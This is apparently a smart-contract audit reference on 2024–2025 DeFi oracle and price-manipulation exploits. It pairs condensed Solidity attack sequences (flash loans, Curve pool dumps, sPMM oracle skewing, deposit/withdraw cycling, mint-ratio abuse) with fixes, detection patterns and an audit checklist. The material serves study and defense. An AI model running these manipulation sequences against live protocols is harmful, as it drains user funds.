---
# Core Classification
protocol: "generic"
chain: "ethereum, arbitrum, bsc, base"
category: "oracle"
vulnerability_type: "price_manipulation, amm_oracle, curve_oracle, self_referencing_oracle, faulty_feed"

# Pattern Identity (Required)
root_cause_family: missing_validation
pattern_key: price_manipulation | price_feed | economic_exploit | fund_loss

# Interaction Scope
interaction_scope: single_contract

# Attack Vector Details
attack_type: "economic_exploit"
affected_component: "price_feed, oracle_integration, collateral_valuation"

# Oracle-Specific Fields
oracle_provider: "curve, custom_amm, wooracle, chainlink"
oracle_attack_vector: "manipulation, spot_price, flash_loan, self_referencing, feed_misconfiguration"

# Technical Primitives
primitives:
  - "curve_pool_price"
  - "amm_spot_price"
  - "sPMM_oracle"
  - "wooracle"
  - "flash_loan_manipulation"
  - "liquidation_bonus"
  - "price_pump_dump"
  - "deposit_withdraw_cycle"
  - "sync_in_transfer"
  - "deflationary_token_sync"
  - "broken_mint_ratio"
  - "chainlink_misconfiguration"
  - "wrsETH_oracle"

# Impact Classification
severity: "critical"
impact: "fund_loss"
exploitability: 0.85
financial_impact: "critical"

# Grep / Hunt-Card Seeds (Required)
code_keywords:
  - "TWAP"
  - "sPMM"
  - "sync"
  - "sUSDE"
  - "_update"
  - "deposit"
  - "UniProxy"
  - "withdraw"
  - "wooracle"
  - "_transfer"
  - "pair.sync"
  - "MAX_DEVIATION"
  - "getAssetPrice"
  - "calculatePrice"
  - "driveUpsUSDEPrice"
path_keys:
  - "curve_pool_based_oracle_manipulation_for_lending_liquidation"
  - "self_referencing_oracle_spmm_manipulation"
  - "concentrated_liquidity_vault_deposit_withdraw_cycling"
  - "defective_token_transfer_hook_price_disruption"
  - "broken_vault_mint_ratio"
  - "faulty_chainlink_oracle_price_feed"

# Context Tags
tags:
  - "defi"
  - "oracle"
  - "price_manipulation"
  - "lending"
  - "amm"
  - "curve"
  - "flash_loan"
  - "liquidation"
  - "self_referencing"
  - "spot_price"
  - "chainlink"
  - "wooracle"

# Version Info
language: "solidity"
version: ">=0.8.0"
---

## References

| Tag | Source | Path / URL |
|-----|--------|------------|
| [UWU-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2024-06/UwuLend_First_exp.sol` |
| [WOO-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2024-03/Woofi_exp.sol` |
| [GAMMA-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2024-01/Gamma_exp.sol` |
| [NGP-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2025-09/NGP_exp.sol` |
| [MBU-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2025-05/MBUToken_exp.sol` |
| [MOON-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2025-11/Moonwell_exp.sol` |

---

# Price Manipulation & Oracle Attack Patterns (2024-2025)
## Overview

Price manipulation and oracle attacks remain a dominant exploit vector in 2024-2025, causing over **$38M** in losses. The attack surface has evolved from simple flash-loan-based AMM manipulation to more sophisticated patterns including Curve pool-based oracle manipulation for lending liquidation (UwULend $19.3M), self-referencing oracle exploitation in proactive market makers (WooFi $8M), concentrated liquidity vault deposit/withdraw cycling (Gamma $6.3M), defective token transfer hooks that disrupt AMM pricing (NGP $2M), broken vault mint ratios (MBUToken $2.16M), and faulty Chainlink price feed configurations for wrapped staked ETH (Moonwell $1M).

---


### Agent Quick View

| Field | Value |
|-------|-------|
| Root Cause | `missing_validation` |
| Pattern Key | `price_manipulation | price_feed | economic_exploit | fund_loss` |
| Severity | CRITICAL |
| Impact | fund_loss |
| Interaction Scope | `single_contract` |
| Chain(s) | ethereum, arbitrum, bsc, base |


## 1. Curve Pool-Based Oracle Manipulation for Lending Liquidation

> **pathShape**: `atomic`

### Root Cause

Lending protocols that derive collateral/debt asset prices from Curve pool spot prices are vulnerable to flash-loan-driven price manipulation. An attacker can borrow billions across multiple DeFi protocols, dump assets into Curve pools to depress a price, create a leveraged borrow position, then reverse the dumps to inflate the price — triggering profitable self-liquidation with inflated liquidation bonuses.

### Attack Scenario

1. Flash loan ~$1.1B across 6+ lending protocols (Aave V3, V2, Spark, Morpho, etc.)
2. Dump target asset (e.g., USDe) across 5 Curve pools → depresses sUSDE price
3. Create a max-LTV borrow position with WETH collateral, sUSDE debt at depressed price
4. Reverse all Curve swaps → inflates sUSDE price
5. Liquidate the helper position at inflated sUSDE price → liquidation bonus exceeds actual value
6. Drain remaining protocol reserves using stolen aTokens as collateral

### Vulnerable Pattern Examples

**Example 1: UwULend — Curve Pool Oracle Manipulation + Liquidation ($19.3M, Jun 2024)** [Approx Vulnerability: CRITICAL] `@audit` [UWU-POC]

```solidity
// ❌ VULNERABLE: Lending protocol using Curve pool spot prices for sUSDE valuation
// Flash loans from 6 sources total ~$1.1B

// Step 1: Dump USDe across 5 Curve pools to DEPRESS sUSDE price
function driveDownsUSDEPrice() internal {
    USDecrvUSDPool.exchange(0, 1, 8_730_453e18, 0, address(this));    // USDe → crvUSD
    USDeDAIPool.exchange(0, 1, 14_477_791e18, 0, address(this));      // USDe → DAI
    FRAXUSDePool.exchange(1, 0, 46_652_158e18, 0, address(this));     // USDe → FRAX
    GHOUSDePool.exchange(1, 0, 4_925_427e18, 0, address(this));       // USDe → GHO
    USDCUSDePool.exchange(0, 1, 14_886_912e18, 0, address(this));     // USDe → USDC
    // @audit sUSDE oracle price now significantly depressed
}

// Step 2: Create max-LTV borrow position at depressed price
toBeLiquidatedHelper.openPosition();   // borrows sUSDE at artificially low price
toBeLiquidatedHelper.withdrawCollateralToLiquidationThreshold();

// Step 3: Reverse all Curve swaps to INFLATE sUSDE price
function driveUpsUSDEPrice() internal {
    USDecrvUSDPool.exchange(1, 0, 12_924_955e18, 0, address(this));   // crvUSD → USDe
    USDeDAIPool.exchange(1, 0, 25_373_741e18, 0, address(this));      // DAI → USDe
    FRAXUSDePool.exchange(0, 1, 69_315_752e18, 0, address(this));     // FRAX → USDe
    // @audit sUSDE oracle price now significantly inflated
}

// Step 4: Liquidate at inflated price → liquidation bonus creates bad debt
uwuLendPool.liquidationCall(
    address(WETH), address(sUSDE), address(toBeLiquidatedHelper),
    sUSDE.balanceOf(address(this)), true
);
// @audit Liquidation bonus on inflated debt exceeds actual collateral
// Repeat until all WETH collateral drained
while (uWETH.balanceOf(address(toBeLiquidatedHelper)) > 0) {
    uwuLendPool.liquidationCall(...);
}
// @audit $19.3M drained via manipulated liquidation
```

---

## 2. Self-Referencing Oracle (sPMM) Manipulation

> **pathShape**: `atomic`

### Root Cause

Proactive market maker (PMM) DEXes like WooPPV2 use an internal oracle (WooracleV2) that updates its price state based on swaps executed through the same pool. This creates a circular dependency: the oracle price determines swap rates, and swap execution updates the oracle price. Large swaps can manipulate the oracle into extreme states, and subsequent swaps drain the pool at distorted rates.

### Vulnerable Pattern Examples

**Example 2: WooFi — Self-Referencing sPMM Oracle ($8M, Mar 2024)** [Approx Vulnerability: CRITICAL] `@audit` [WOO-POC]

```solidity
// ❌ VULNERABLE: WooPPV2 oracle updates from its own swaps
// sPMM (Synthetic Proactive Market Making) oracle lacks circuit breaker

// Step 1: Flash loan USDCe + borrow all WOO liquidity from Silo
IUniswapV3Flash(Univ3pool).flash(address(this), 0, uni_flash_amount, new bytes(1));
ISilo(Silo).deposit(address(USDCe), 7_000_000_000_000, true);
ISilo(Silo).borrow(address(WOO), woo_liquidity_amount);

// Step 2: Large swap moves internal oracle price
USDCe.transfer(WooPPV2, 2_000_000_000_000);
IWooPPV2(WooPPV2).swap(address(USDCe), address(WETH), 2_000_000_000_000, 0, address(this), address(this));
// @audit WooracleV2 state updated with skewed USDCe/WETH price

// Step 3: Smaller swap resets WOO oracle state
USDCe.transfer(WooPPV2, 100_000_000_000);
IWooPPV2(WooPPV2).swap(address(USDCe), address(WOO), 100_000_000_000, 0, address(this), address(this));
// @audit WOO oracle price now in attacker-favorable state

// Step 4: Dump massive WOO at manipulated price → drains pool
uint256 woo_amount_swap = 7_856_868_800_000_000_000_000_000;
WOO.transfer(WooPPV2, woo_amount_swap);
IWooPPV2(WooPPV2).swap(address(WOO), address(USDCe), woo_amount_swap, 0, address(this), address(this));
// @audit Pool drained of USDCe at distorted exchange rate

// Step 5: Tiny cleanup swap drains residual
USDCe.transfer(WooPPV2, 926_342);
IWooPPV2(WooPPV2).swap(address(USDCe), address(WOO), 926_342, 0, address(this), address(this));
// @audit $8M profit: sPMM had no single-tx price movement bounds
```

---

## 3. Concentrated Liquidity Vault Deposit/Withdraw Cycling

> **pathShape**: `atomic`

### Root Cause

Concentrated liquidity vaults (e.g., Gamma on Algebra/Uniswap V3) calculate LP share amounts based on the current spot price of the underlying pool. When an attacker manipulates the pool price, deposits at the distorted price receive inflated shares, and immediate withdrawal returns more tokens than deposited. Repeating this cycle 15+ times compounds the extraction.

### Vulnerable Pattern Examples

**Example 3: Gamma Strategies — Spot Price Deposit Cycling ($6.3M, Jan 2024)** [Approx Vulnerability: CRITICAL] `@audit` [GAMMA-POC]

```solidity
// ❌ VULNERABLE: Gamma UniProxy.deposit() uses spot price for share calculation
// No TWAP check, no price deviation guard, no deposit/withdrawal cooldown

// Repeat 15 times:
for (uint256 i = 0; i < 15; i++) {
    // Step A: Swap USDT→USDCe on Algebra pool → moves price DOWN
    I(algebra_pool).swap(
        address(this), true,
        int256(I(usdt).balanceOf(address(this))),
        calculatePrice(),  // @audit Target ~14.4% below current price
        ""
    );

    // Step B: Deposit into Gamma vault at manipulated (low) price → inflated LP shares
    uint256 shares = I(uniproxy).deposit(1, 300_000_000_000, address(this), usdt_usdce_pool, empty_arr);
    // @audit Share calculation uses current spot price, not TWAP
    // Attacker gets more shares than fair value

    // Step C: Withdraw immediately → receives more tokens than deposited
    I(usdt_usdce_pool).withdraw(shares, address(this), address(this), empty_arr);
    // @audit Net profit each cycle due to price discrepancy

    // Step D: Swap USDCe→USDT to reverse price
    I(algebra_pool).swap(address(this), false, int256(I(usdce).balanceOf(address(this))),
        83_949_998_135_706_271_822_084_553_181, "");

    // Reset: tiny deposit to normalize state
    I(uniproxy).deposit(1, 1_000_000, address(this), usdt_usdce_pool, empty_arr);
}

function calculatePrice() internal returns (uint160) {
    I.GlobalState memory gs = I(algebra_pool).globalState();
    return (gs.price * 85_572) / 100_000;  // @audit 14.4% price movement target
}
// @audit $6.3M extracted via 15 pump-deposit-dump cycles
```

---

## 4. Defective Token Transfer Hook Price Disruption

> **pathShape**: `atomic`

### Root Cause

Custom ERC20 tokens that call `pair.sync()` inside their `_update()` or `_transfer()` function disrupt AMM pricing mechanics. When a swap sends tokens to the pair, the transfer triggers `sync()` which resets reserves to reflect the incoming tokens *before* the swap output is calculated. This causes the AMM to miscalculate the output amount, paying far more than warranted.

### Vulnerable Pattern Examples

**Example 4: NGP Token — Premature sync() in _update() ($2M, Sep 2025)** [Approx Vulnerability: CRITICAL] `@audit` [NGP-POC]

```solidity
// ❌ VULNERABLE: NGP token's _update() calls pair.sync() during transfer
// This resets reserves BEFORE the swap's output calculation completes

// Step 1: Flash loan 211M USDT, swap ALL into NGP (sent to dead address)
uint256 FLASHLOAN_AMOUNT = 211_000_000 * 10 ** 18;
router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
    FLASHLOAN_AMOUNT, 0, [usdt, ngpToken], deadAddress, block.timestamp
);
// @audit Pair now holds massive USDT, minimal NGP

// Step 2: Swap pre-held NGP → USDT
// BUG: When NGP is transferred TO the pair, _update() calls pair.sync()
router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
    ngpToken.balanceOf(address(this)),  // Only 1.35M NGP
    0,
    [ngpToken, usdt],
    address(this),
    block.timestamp
);
// @audit During this swap's token transfer to pair:
// 1. NGP._update() detects transfer to pair address
// 2. Calls pair.sync() → reserves updated to include incoming NGP
// 3. But swap output calculation uses OLD reserves (pre-sync)
// 4. AMM thinks it has far LESS NGP than it actually does
// 5. Pays out enormously inflated USDT amount
// $2M profit from 1.35M NGP tokens
```

---

## 5. Broken Vault Mint Ratio

> **pathShape**: `atomic`

### Root Cause

Vaults or proxy contracts with misconfigured exchange rates or missing decimal normalization can mint vastly disproportionate token amounts for trivial deposits. This often occurs in ERC1967 proxy vaults where the implementation contract has an uninitialized or hardcoded exchange rate that doesn't account for token decimal differences.

### Vulnerable Pattern Examples

**Example 5: MBUToken — Broken Deposit-to-Mint Ratio ($2.16M, May 2025)** [Approx Vulnerability: CRITICAL] `@audit` [MBU-POC]

```solidity
// ❌ VULNERABLE: ERC1967 proxy vault has broken exchange rate
// 0.001 WBNB deposit → 30,000,000 MBU tokens minted

// Step 1: Deposit trivial amount — 0.001 WBNB
WETH9(payable(wbnb)).deposit{value: 0.001 ether}();
IERC20(wbnb).approve(_0x95e9_ERC1967Proxy, 0.001 ether);
I_0x95e9_ERC1967Proxy(_0x95e9_ERC1967Proxy).deposit(wbnb, 0.001 ether);
// @audit Receives 30,000,000 MBU tokens (30M) for 0.001 BNB
// Exchange rate is ~10^10× too high — decimal/rate misconfiguration

// Step 2: Dump all MBU tokens on PancakeSwap
IERC20(MBU).approve(router, type(uint256).max);
IPancakeRouter(payable(router)).swapExactTokensForTokensSupportingFeeOnTransferTokens(
    30_000_000 ether, 0, [MBU, BUSD], address(this), block.timestamp
);
// @audit $2.16M BUSD extracted from a 0.001 BNB deposit
// Total investment: 0.001 BNB + 0.999 BNB for MEV protection = 1 BNB
```

---

## 6. Faulty Chainlink Oracle Price Feed

> **pathShape**: `callback-reentrant`

### Root Cause

When Chainlink oracle feeds report incorrect prices for wrapped staked tokens (e.g., wrsETH vs wstETH), the price discrepancy between oracle-reported value and actual market value creates an arbitrage opportunity. Attackers flash-borrow the overvalued asset, deposit as collateral at the inflated oracle price, borrow the undervalued asset, and swap at the correct market price.

### Vulnerable Pattern Examples

**Example 6: Moonwell — Faulty wrsETH Oracle Feed ($1M, Nov 2025)** [Approx Vulnerability: HIGH] `@audit` [MOON-POC]

```solidity
// ❌ VULNERABLE: Chainlink oracle overvalues wrsETH relative to wstETH
// Simple deposit-borrow-swap cycle extracts oracle mispricing

// Step 1: Flash loan wrsETH from Uniswap V3 CL pool
uint256 FLASH_AMOUNT = 20_782_357_954_960;  // wrsETH
clPoolWstEthWrsEth.flash(address(this), 0, FLASH_AMOUNT, bytes(""));

// Step 2: In callback — deposit wrsETH into Moonwell at inflated oracle price
wrsEth.approve(address(mwrsEth), flashAmount);
mwrsEth.mint(flashAmount);
// @audit Oracle reports wrsETH price higher than actual market rate

// Step 3: Enable as collateral
address[] memory markets = new address[](1);
markets[0] = address(mwrsEth);
comptroller.enterMarkets(markets);

// Step 4: Over-borrow wstETH — oracle overvalues collateral
uint256 BORROW_AMOUNT = 20_592_096_934_942_276_800;  // nearly equal to deposit!
mwstEth.borrow(BORROW_AMOUNT);
// @audit Borrows ~20.59 wstETH against ~20.78 wrsETH collateral
// Only possible because oracle overprices wrsETH

// Step 5: Swap at the CORRECT market rate → profit
clPoolWstEthWeth.swap(address(this), false, int256(wstBalance), MAX_SQRT_RATIO - 1, bytes(""));
v3PoolWrsEthWeth.swap(address(this), true, int256(wethBalance), MIN_SQRT_RATIO + 1, bytes(""));

// Step 6: Repay flash loan + keep spread
wrsEth.transfer(address(clPoolWstEthWrsEth), flashAmount + fee1);
// @audit Profit: oracle mispricing spread × flash loan size
// $1M extracted via pure oracle arbitrage — no complex manipulation needed
```

---

## Impact Analysis

### Technical Impact
- Curve pool spot price manipulation enables profitable self-liquidation loops
- Self-referencing oracles allow single-transaction price distortion without external dependencies
- Concentrated liquidity vault share calculations using spot price are cyclically exploitable
- Defective token transfer hooks disrupt AMM invariant calculations mid-swap
- Broken vault mint ratios allow trivial deposits to mint catastrophic token amounts
- Stale or misconfigured Chainlink feeds create risk-free oracle arbitrage

### Business Impact
- **UwULend**: $19.3M loss — Curve pool oracle manipulation enabled manipulated liquidation
- **WooFi**: $8M loss — sPMM oracle updated by its own swaps, no circuit breaker
- **Gamma Strategies**: $6.3M loss — spot price-based LP shares exploited 15 times
- **NGP Token**: $2M loss — defective `_update()` with `sync()` call disrupted AMM
- **MBUToken**: $2.16M loss — 0.001 BNB deposit → 30M tokens (broken mint ratio)
- **Moonwell**: $1M loss — Chainlink wrsETH feed overvalued relative to market
- Combined 2024-2025 oracle/price manipulation damage: **$38M+**

### Affected Scenarios
- Lending protocols using Curve pool spot prices for asset valuation
- PMM DEXes with self-referencing internal oracles
- Concentrated liquidity vaults using spot price for share calculation
- Custom ERC20 tokens with transfer hooks that call `sync()` on AMM pairs
- Proxy vaults with uninitialized or misconfigured exchange rates
- Lending markets with wrapped staked token Chainlink feeds

---

## Secure Implementation

**Fix 1: TWAP-Based Oracle with Deviation Bounds**
```solidity
// ✅ SECURE: Use TWAP with max deviation check instead of spot price
function getAssetPrice(address asset) external view returns (uint256) {
    uint256 spotPrice = _getSpotPrice(asset);
    uint256 twapPrice = _getTWAP(asset, TWAP_WINDOW); // e.g., 30-minute TWAP

    // @audit Reject if spot deviates more than MAX_DEVIATION from TWAP
    uint256 deviation = spotPrice > twapPrice
        ? (spotPrice - twapPrice) * 1e18 / twapPrice
        : (twapPrice - spotPrice) * 1e18 / twapPrice;
    require(deviation <= MAX_DEVIATION, "Price deviation too high"); // e.g., 5%

    return twapPrice;
}
```

**Fix 2: Deposit Cooldown + TWAP Check for Vaults**
```solidity
// ✅ SECURE: Prevent same-block deposit/withdraw and use TWAP for share pricing
function deposit(uint256 amount) external returns (uint256 shares) {
    uint256 currentPrice = oracle.getTWAP(TWAP_WINDOW);
    uint256 lastPrice = oracle.getTWAP(TWAP_WINDOW - 1);

    // @audit Reject if price moved significantly in recent blocks
    require(_priceDeviation(currentPrice, lastPrice) <= MAX_DEPOSIT_DEVIATION, "Price unstable");

    shares = (amount * totalShares) / totalAssets();
    lastDepositBlock[msg.sender] = block.number;

    _mint(msg.sender, shares);
}

function withdraw(uint256 shares) external {
    // @audit Enforce cooldown period between deposit and withdrawal
    require(block.number >= lastDepositBlock[msg.sender] + COOLDOWN_BLOCKS, "Cooldown active");
    // ... withdrawal logic
}
```

**Fix 3: Circuit Breaker for Self-Referencing Oracles**
```solidity
// ✅ SECURE: Limit single-transaction price movement
function _updateOracleState(uint256 newPrice) internal {
    uint256 oldPrice = state.price;

    // @audit Cap price movement per swap to prevent manipulation
    uint256 maxMove = oldPrice * MAX_SINGLE_SWAP_IMPACT / 1e18; // e.g., 1%
    if (newPrice > oldPrice + maxMove) newPrice = oldPrice + maxMove;
    if (newPrice < oldPrice - maxMove) newPrice = oldPrice - maxMove;

    state.price = uint128(newPrice);
}
```

---

## Detection Patterns

### Code Patterns to Look For
```
- Pattern 1: Lending oracle reading Curve pool.get_dy() or exchange() output for pricing
- Pattern 2: DEX oracle updated inside the same swap() function execution
- Pattern 3: vault.deposit() using pool.slot0() or globalState().price for share calculation
- Pattern 4: token._update() or _transfer() calling pair.sync() or pair.skim()
- Pattern 5: vault.deposit() → mint() with hardcoded or uninitialized exchange rate
- Pattern 6: Chainlink oracle for wrapped staked tokens (wrsETH, wstETH) without rate validation
```

### Audit Checklist
- [ ] Can the oracle price be moved >5% within a single transaction?
- [ ] Does the protocol use AMM spot prices instead of TWAP for collateral valuation?
- [ ] Is there a circuit breaker for single-transaction price movements?
- [ ] Does the DEX oracle update from its own swap execution?
- [ ] Do deposit/withdraw share calculations use current spot price?
- [ ] Can tokens be deposited and withdrawn in the same block?
- [ ] Does the token's transfer function call external contracts (sync, skim)?
- [ ] Is the vault exchange rate properly initialized and decimal-normalized?
- [ ] Is the Chainlink oracle feed verified against actual market rates?

---

## Real-World Examples

### Known Exploits
- **UwULend** — $19.3M — Curve pool-based sUSDE oracle manipulation + liquidation — Jun 2024
- **WooFi** — $8M — Self-referencing sPMM oracle manipulation — Mar 2024
- **Gamma Strategies** — $6.3M — Spot price deposit/withdraw cycling — Jan 2024
- **NGP Token** — $2M — Defective _update() with premature sync() — Sep 2025
- **MBUToken** — $2.16M — Broken vault deposit-to-mint ratio — May 2025
- **Moonwell** — $1M — Faulty Chainlink wrsETH oracle feed — Nov 2025

---

## Prevention Guidelines

### Development Best Practices
1. Never use AMM spot prices as oracle feeds — always use TWAP with sufficient window
2. Implement circuit breakers limiting single-transaction price movements
3. Ensure oracle price sources are independent of the protocol's own operations
4. Validate Chainlink oracle feed accuracy against multiple market price sources
5. Add deposit cooldowns preventing same-block/same-transaction deposit-withdraw
6. Audit custom token transfer hooks for external calls that disrupt AMM state
7. Validate vault exchange rates are properly initialized and decimal-normalized

### Testing Requirements
- Unit tests for: oracle price with ±50% spot manipulation
- Integration tests for: flash loan → manipulate → deposit → borrow → repay cycle
- Fuzzing targets: deposit/withdraw cycling with varying price manipulation amounts
- Invariant tests: oracle price always within MAX_DEVIATION of reference price

---

## Keywords for Search

`price manipulation`, `oracle manipulation`, `Curve oracle`, `spot price`, `TWAP`, `self-referencing oracle`, `sPMM`, `wooracle`, `flash loan oracle`, `concentrated liquidity`, `deposit withdraw cycle`, `pump dump`, `Algebra pool`, `UniProxy`, `liquidation manipulation`, `sUSDE`, `pair.sync`, `defective transfer`, `_update hook`, `broken mint ratio`, `Chainlink misconfiguration`, `wrsETH oracle`, `oracle arbitrage`, `circuit breaker`, `price deviation`, `AMM oracle`, `getUnderlyingPrice`, `getAssetPrice`, `exchange rate`

---

## Related Vulnerabilities

- `DB/oracle/price-manipulation/defihacklabs-price-manipulation-patterns.md` — Earlier price manipulation patterns (2021)
- `DB/oracle/price-manipulation/defihacklabs-flashloan-oracle-2022-patterns.md` — Flash loan oracle patterns (2022)
- `DB/general/precision/defihacklabs-precision-share-manipulation-2024-2025.md` — Precision loss patterns
- `DB/general/flash-loan/` — Flash loan attack patterns
